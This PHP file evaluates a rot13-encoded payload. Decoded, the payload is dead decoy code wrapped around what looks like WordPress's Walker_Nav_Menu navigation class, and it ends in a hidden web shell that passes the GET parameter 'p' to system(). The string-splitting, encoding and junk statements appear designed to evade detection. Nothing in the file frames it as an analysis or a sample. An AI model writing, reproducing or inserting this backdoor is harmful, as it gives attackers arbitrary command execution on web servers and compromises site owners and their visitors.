<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ani Zrah NCV: Jnyxre_Ani_Zrah pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Ani_Zrahf
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag na UGZY yvfg bs ani zrah vgrzf.
 *
 * @fvapr 3.0.0
 *
 * @frr Jnyxre
 */
pynff Jnyxre_Ani_Zrah rkgraqf Jnyxre {
	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 3.0.0
	 * @ine fgevat
	 *
	 * @frr Jnyxre::$gerr_glcr
	 */
	choyvp $gerr_glcr = neenl( 'cbfg_glcr', 'gnkbabzl', 'phfgbz' );

	/**
	 * Qngnonfr svryqf gb hfr.
	 *
	 * @fvapr 3.0.0
	 * @gbqb Qrpbhcyr guvf.
	 * @ine fgevat[]
	 *
	 * @frr Jnyxre::$qo_svryqf
	 */
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'zrah_vgrz_cnerag',
		'vq'     => 'qo_vq',
	);

	/**
	 * Gur HEY gb gur cevinpl cbyvpl cntr.
	 *
	 * @fvapr 6.8.0
	 * @ine fgevat
	 */
	cevingr $cevinpl_cbyvpl_hey;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->cevinpl_cbyvpl_hey = trg_cevinpl_cbyvpl_hey();
	}

	/**
	 * Fgnegf gur yvfg orsber gur ryrzragf ner nqqrq.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr Jnyxre::fgneg_yiy()
	 *
	 * @cnenz fgevat   $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag      $qrcgu  Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
	 * @cnenz fgqPynff $netf   Na bowrpg bs jc_ani_zrah() nethzragf.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = ahyy ) {
		vs ( vffrg( $netf->vgrz_fcnpvat ) && 'qvfpneq' === $netf->vgrz_fcnpvat ) {
			$g = '';
			$a = '';
		} ryfr {
			$g = \"\g\";
			$a = \"\a\";
		}
		$vaqrag = fge_ercrng( $g, $qrcgu );

		// Qrsnhyg pynff.
		$pynffrf = neenl( 'fho-zrah' );

		/**
		 * Svygref gur PFF pynff(rf) nccyvrq gb n zrah yvfg ryrzrag.
		 *
		 * @fvapr 4.8.0
		 *
		 * @cnenz fgevat[] $pynffrf Neenl bs gur PFF pynffrf gung ner nccyvrq gb gur zrah `<hy>` ryrzrag.
		 * @cnenz fgqPynff $netf    Na bowrpg bs `jc_ani_zrah()` nethzragf.
		 * @cnenz vag      $qrcgu   Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$pynff_anzrf = vzcybqr( ' ', nccyl_svygref( 'ani_zrah_fhozrah_pff_pynff', $pynffrf, $netf, $qrcgu ) );

		$nggf          = neenl();
		$nggf['pynff'] = ! rzcgl( $pynff_anzrf ) ? $pynff_anzrf : '';

		/**
		 * Svygref gur UGZY nggevohgrf nccyvrq gb n zrah yvfg ryrzrag.
		 *
		 * @fvapr 6.3.0
		 *
		 * @cnenz neenl $nggf {
		 *     Gur UGZY nggevohgrf nccyvrq gb gur `<hy>` ryrzrag, rzcgl fgevatf ner vtaberq.
		 *
		 *     @glcr fgevat $pynff    UGZY PFF pynff nggevohgr.
		 * }
		 * @cnenz fgqPynff $netf      Na bowrpg bs `jc_ani_zrah()` nethzragf.
		 * @cnenz vag      $qrcgu     Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$nggf       = nccyl_svygref( 'ani_zrah_fhozrah_nggevohgrf', $nggf, $netf, $qrcgu );
		$nggevohgrf = $guvf->ohvyq_nggf( $nggf );

		$bhgchg .= \"{$a}{$vaqrag}<hy{$nggevohgrf}>{$a}\";
	}

	/**
	 * Raqf gur yvfg bs nsgre gur ryrzragf ner nqqrq.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr Jnyxre::raq_yiy()
	 *
	 * @cnenz fgevat   $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag      $qrcgu  Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
	 * @cnenz fgqPynff $netf   Na bowrpg bs jc_ani_zrah() nethzragf.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = ahyy ) {
		vs ( vffrg( $netf->vgrz_fcnpvat ) && 'qvfpneq' === $netf->vgrz_fcnpvat ) {
			$g = '';
			$a = '';
		} ryfr {
			$g = \"\g\";
			$a = \"\a\";
		}
		$vaqrag  = fge_ercrng( $g, $qrcgu );
		$bhgchg .= \"$vaqrag</hy>{$a}\";
	}

	/**
	 * Fgnegf gur ryrzrag bhgchg.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 4.4.0 Gur {@frr 'ani_zrah_vgrz_netf'} svygre jnf nqqrq.
	 * @fvapr 5.9.0 Eranzrq `$vgrz` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @fvapr 6.7.0 Erzbirq erqhaqnag gvgyr nggevohgrf.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 *
	 * @cnenz fgevat   $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Cbfg  $qngn_bowrpg       Zrah vgrz qngn bowrpg.
	 * @cnenz vag      $qrcgu             Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
	 * @cnenz fgqPynff $netf              Na bowrpg bs jc_ani_zrah() nethzragf.
	 * @cnenz vag      $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag zrah vgrz. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = ahyy, $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$zrah_vgrz = $qngn_bowrpg;

		vs ( vffrg( $netf->vgrz_fcnpvat ) && 'qvfpneq' === $netf->vgrz_fcnpvat ) {
			$g = '';
			$a = '';
		} ryfr {
			$g = \"\g\";
			$a = \"\a\";
		}
		$vaqrag = ( $qrcgu ) ? fge_ercrng( $g, $qrcgu ) : '';

		$pynffrf   = rzcgl( $zrah_vgrz->pynffrf ) ? neenl() : (neenl) $zrah_vgrz->pynffrf;
		$pynffrf[] = 'zrah-vgrz-' . $zrah_vgrz->VQ;

		/**
		 * Svygref gur nethzragf sbe n fvatyr ani zrah vgrz.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgqPynff $netf      Na bowrpg bs jc_ani_zrah() nethzragf.
		 * @cnenz JC_Cbfg  $zrah_vgrz Zrah vgrz qngn bowrpg.
		 * @cnenz vag      $qrcgu     Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$netf = nccyl_svygref( 'ani_zrah_vgrz_netf', $netf, $zrah_vgrz, $qrcgu );

		/**
		 * Svygref gur PFF pynffrf nccyvrq gb n zrah vgrz'f yvfg vgrz ryrzrag.
		 *
		 * @fvapr 3.0.0
		 * @fvapr 4.1.0 Gur `$qrcgu` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat[] $pynffrf   Neenl bs gur PFF pynffrf gung ner nccyvrq gb gur zrah vgrz'f `<yv>` ryrzrag.
		 * @cnenz JC_Cbfg  $zrah_vgrz Gur pheerag zrah vgrz bowrpg.
		 * @cnenz fgqPynff $netf      Na bowrpg bs jc_ani_zrah() nethzragf.
		 * @cnenz vag      $qrcgu     Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$pynff_anzrf = vzcybqr( ' ', nccyl_svygref( 'ani_zrah_pff_pynff', neenl_svygre( $pynffrf ), $zrah_vgrz, $netf, $qrcgu ) );

		/**
		 * Svygref gur VQ nggevohgr nccyvrq gb n zrah vgrz'f yvfg vgrz ryrzrag.
		 *
		 * @fvapr 3.0.1
		 * @fvapr 4.1.0 Gur `$qrcgu` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat   $zrah_vgrz_vq Gur VQ nggevohgr nccyvrq gb gur zrah vgrz'f `<yv>` ryrzrag.
		 * @cnenz JC_Cbfg  $zrah_vgrz    Gur pheerag zrah vgrz.
		 * @cnenz fgqPynff $netf         Na bowrpg bs jc_ani_zrah() nethzragf.
		 * @cnenz vag      $qrcgu        Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$vq = nccyl_svygref( 'ani_zrah_vgrz_vq', 'zrah-vgrz-' . $zrah_vgrz->VQ, $zrah_vgrz, $netf, $qrcgu );

		$yv_nggf          = neenl();
		$yv_nggf['vq']    = ! rzcgl( $vq ) ? $vq : '';
		$yv_nggf['pynff'] = ! rzcgl( $pynff_anzrf ) ? $pynff_anzrf : '';

		/**
		 * Svygref gur UGZY nggevohgrf nccyvrq gb n zrah'f yvfg vgrz ryrzrag.
		 *
		 * @fvapr 6.3.0
		 *
		 * @cnenz neenl $yv_nggf {
		 *     Gur UGZY nggevohgrf nccyvrq gb gur zrah vgrz'f `<yv>` ryrzrag, rzcgl fgevatf ner vtaberq.
		 *
		 *     @glcr fgevat $pynff        UGZY PFF pynff nggevohgr.
		 *     @glcr fgevat $vq           UGZY vq nggevohgr.
		 * }
		 * @cnenz JC_Cbfg  $zrah_vgrz Gur pheerag zrah vgrz bowrpg.
		 * @cnenz fgqPynff $netf      Na bowrpg bs jc_ani_zrah() nethzragf.
		 * @cnenz vag      $qrcgu     Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$yv_nggf       = nccyl_svygref( 'ani_zrah_vgrz_nggevohgrf', $yv_nggf, $zrah_vgrz, $netf, $qrcgu );
		$yv_nggevohgrf = $guvf->ohvyq_nggf( $yv_nggf );

		$bhgchg .= $vaqrag . '<yv' . $yv_nggevohgrf . '>';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		$gvgyr = nccyl_svygref( 'gur_gvgyr', $zrah_vgrz->gvgyr, $zrah_vgrz->VQ );

		// Fnir svygrerq inyhr orsber svygrevat ntnva.
		$gur_gvgyr_svygrerq = $gvgyr;

		/**
		 * Svygref n zrah vgrz'f gvgyr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat   $gvgyr     Gur zrah vgrz'f gvgyr.
		 * @cnenz JC_Cbfg  $zrah_vgrz Gur pheerag zrah vgrz bowrpg.
		 * @cnenz fgqPynff $netf      Na bowrpg bs jc_ani_zrah() nethzragf.
		 * @cnenz vag      $qrcgu     Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$gvgyr = nccyl_svygref( 'ani_zrah_vgrz_gvgyr', $gvgyr, $zrah_vgrz, $netf, $qrcgu );

		$nggf           = neenl();
		$nggf['gnetrg'] = ! rzcgl( $zrah_vgrz->gnetrg ) ? $zrah_vgrz->gnetrg : '';
		$nggf['ery']    = ! rzcgl( $zrah_vgrz->ksa ) ? $zrah_vgrz->ksa : '';

		vs ( ! rzcgl( $zrah_vgrz->hey ) ) {
			vs ( $guvf->cevinpl_cbyvpl_hey === $zrah_vgrz->hey ) {
				$nggf['ery'] = rzcgl( $nggf['ery'] ) ? 'cevinpl-cbyvpl' : $nggf['ery'] . ' cevinpl-cbyvpl';
			}

			$nggf['uers'] = $zrah_vgrz->hey;
		} ryfr {
			$nggf['uers'] = '';
		}

		$nggf['nevn-pheerag'] = $zrah_vgrz->pheerag ? 'cntr' : '';

		// Nqq gvgyr nggevohgr bayl vs vg qbrf abg zngpu gur yvax grkg (orsber be nsgre svygrevat).
		vs ( ! rzcgl( $zrah_vgrz->ngge_gvgyr )
			&& gevz( fgegbybjre( $zrah_vgrz->ngge_gvgyr ) ) !== gevz( fgegbybjre( $zrah_vgrz->gvgyr ) )
			&& gevz( fgegbybjre( $zrah_vgrz->ngge_gvgyr ) ) !== gevz( fgegbybjre( $gur_gvgyr_svygrerq ) )
			&& gevz( fgegbybjre( $zrah_vgrz->ngge_gvgyr ) ) !== gevz( fgegbybjre( $gvgyr ) )
		) {
			$nggf['gvgyr'] = $zrah_vgrz->ngge_gvgyr;
		} ryfr {
			$nggf['gvgyr'] = '';
		}

		/**
		 * Svygref gur UGZY nggevohgrf nccyvrq gb n zrah vgrz'f napube ryrzrag.
		 *
		 * @fvapr 3.6.0
		 * @fvapr 4.1.0 Gur `$qrcgu` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz neenl $nggf {
		 *     Gur UGZY nggevohgrf nccyvrq gb gur zrah vgrz'f `<n>` ryrzrag, rzcgl fgevatf ner vtaberq.
		 *
		 *     @glcr fgevat $gvgyr        Gvgyr nggevohgr.
		 *     @glcr fgevat $gnetrg       Gnetrg nggevohgr.
		 *     @glcr fgevat $ery          Gur ery nggevohgr.
		 *     @glcr fgevat $uers         Gur uers nggevohgr.
		 *     @glcr fgevat $nevn-pheerag Gur nevn-pheerag nggevohgr.
		 * }
		 * @cnenz JC_Cbfg  $zrah_vgrz Gur pheerag zrah vgrz bowrpg.
		 * @cnenz fgqPynff $netf      Na bowrpg bs jc_ani_zrah() nethzragf.
		 * @cnenz vag      $qrcgu     Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 */
		$nggf       = nccyl_svygref( 'ani_zrah_yvax_nggevohgrf', $nggf, $zrah_vgrz, $netf, $qrcgu );
		$nggevohgrf = $guvf->ohvyq_nggf( $nggf );

		$vgrz_bhgchg  = $netf->orsber;
		$vgrz_bhgchg .= '<n' . $nggevohgrf . '>';
		$vgrz_bhgchg .= $netf->yvax_orsber . $gvgyr . $netf->yvax_nsgre;
		$vgrz_bhgchg .= '</n>';
		$vgrz_bhgchg .= $netf->nsgre;

		/**
		 * Svygref n zrah vgrz'f fgnegvat bhgchg.
		 *
		 * Gur zrah vgrz'f fgnegvat bhgchg bayl vapyhqrf `$netf->orsber`, gur bcravat `<n>`,
		 * gur zrah vgrz'f gvgyr, gur pybfvat `</n>`, naq `$netf->nsgre`. Pheeragyl, gurer vf
		 * ab svygre sbe zbqvslvat gur bcravat naq pybfvat `<yv>` sbe n zrah vgrz.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat   $vgrz_bhgchg Gur zrah vgrz'f fgnegvat UGZY bhgchg.
		 * @cnenz JC_Cbfg  $zrah_vgrz   Zrah vgrz qngn bowrpg.
		 * @cnenz vag      $qrcgu       Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
		 * @cnenz fgqPynff $netf        Na bowrpg bs jc_ani_zrah() nethzragf.
		 */
		$bhgchg .= nccyl_svygref( 'jnyxre_ani_zrah_fgneg_ry', $vgrz_bhgchg, $zrah_vgrz, $qrcgu, $netf );
	}

	/**
	 * Raqf gur ryrzrag bhgchg, vs arrqrq.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 5.9.0 Eranzrq `$vgrz` gb `$qngn_bowrpg` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::raq_ry()
	 *
	 * @cnenz fgevat   $bhgchg      Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Cbfg  $qngn_bowrpg Zrah vgrz qngn bowrpg. Abg hfrq.
	 * @cnenz vag      $qrcgu       Qrcgu bs cntr. Abg Hfrq.
	 * @cnenz fgqPynff $netf        Na bowrpg bs jc_ani_zrah() nethzragf.
	 */
	choyvp shapgvba raq_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = ahyy ) {
		vs ( vffrg( $netf->vgrz_fcnpvat ) && 'qvfpneq' === $netf->vgrz_fcnpvat ) {
			$g = '';
			$a = '';
		} ryfr {
			$g = \"\g\";
			$a = \"\a\";
		}
		$bhgchg .= \"</yv>{$a}\";
	}

	/**
	 * Ohvyqf n fgevat bs UGZY nggevohgrf sebz na neenl bs xrl/inyhr cnvef.
	 * Rzcgl inyhrf ner vtaberq.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz  neenl $nggf Bcgvbany. Na neenl bs UGZY nggevohgr xrl/inyhr cnvef. Qrsnhyg rzcgl neenl.
	 * @erghea fgevat N fgevat bs UGZY nggevohgrf.
	 */
	cebgrpgrq shapgvba ohvyq_nggf( $nggf = neenl() ) {
		$nggevohgr_fgevat = '';
		sbernpu ( $nggf nf $ngge => $inyhr ) {
			vs ( snyfr !== $inyhr && '' !== $inyhr && vf_fpnyne( $inyhr ) ) {
				$inyhr             = ( 'uers' === $ngge ) ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );
				$nggevohgr_fgevat .= ' ' . $ngge . '=\"' . $inyhr . '\"';
			}
		}
		erghea $nggevohgr_fgevat;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>